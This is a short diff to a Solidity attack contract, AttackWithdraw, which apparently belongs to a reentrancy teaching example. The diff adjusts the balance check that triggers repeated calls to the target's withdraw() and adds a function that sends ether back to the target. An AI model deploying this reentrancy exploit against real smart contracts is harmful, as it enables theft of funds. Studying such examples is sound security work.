@@ -19,11 +19,18 @@ contract AttackWithdraw {
 
     function attackWithdraw() public {
         if (
-            address(reentrancyExample).balance >
+            address(reentrancyExample).balance >=
             reentrancyExample.balances(address(this))
         ) {
             reentrancyExample.withdraw();
         }
+    }
+
+    function withdraw() public {
+        (bool success, ) = address(reentrancyExample).call{
+            value: address(this).balance
+        }("");
+        require(success);
     }
 
     receive() external payable {
